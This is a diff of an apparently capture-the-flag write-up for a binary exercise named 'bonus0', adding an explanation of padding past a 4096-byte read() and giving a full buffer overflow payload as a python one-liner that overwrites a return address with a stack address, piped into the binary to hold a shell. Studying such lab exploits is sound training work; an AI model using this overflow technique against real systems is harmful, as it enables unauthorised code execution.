@@ -23,7 +23,8 @@ int main(int argc, char **argv) {
 
 `./a.out code` -> `0xbffff916`
 
-4096 because of the read() syscall that read 4096 bytes from stdin for input1.
+4096 because of the read() syscall that read 4096 bytes from stdin for input1, so we fill it to go to the second read using a single file as input.
+9 + 4 + 7 = 20
 full payload:
 `python -c "print 'i'*4095 + '\n' + 'i'*9 + '\x16\xf9\xff\xbf' + 'i'*7" > /tmp/a`
 `cat /tmp/a - |./bonus0`
